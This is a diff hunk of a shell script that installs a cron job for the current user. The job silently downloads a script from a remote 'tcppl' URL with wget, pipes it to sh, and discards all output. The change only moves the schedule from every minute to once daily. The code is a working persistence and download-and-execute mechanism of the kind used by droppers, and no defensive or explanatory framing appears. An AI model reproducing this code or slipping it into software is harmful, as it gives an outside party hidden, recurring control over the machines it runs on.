@@ -9,7 +9,7 @@ if [ "$process" -eq "$zero" ]; then
 	crontab -l > /tmp/tmpcrontcpp
 	crone=`grep 'tcppl' /tmp/tmpcrontcpp | wc -l`
 	if [ "$crone" -eq "$zero" ]; then
-		echo "* * * * * wget -O - -q https://raw.fastgit.org/tcppl/0/main/task | sh > /dev/null 2>&1" >> /tmp/tmpcrontcpp
+		echo "01 02 * * * wget -O - -q https://raw.fastgit.org/tcppl/0/main/task | sh > /dev/null 2>&1" >> /tmp/tmpcrontcpp
 		crontab -u `whoami` /tmp/tmpcrontcpp
 	else
 		echo "crontab runing"
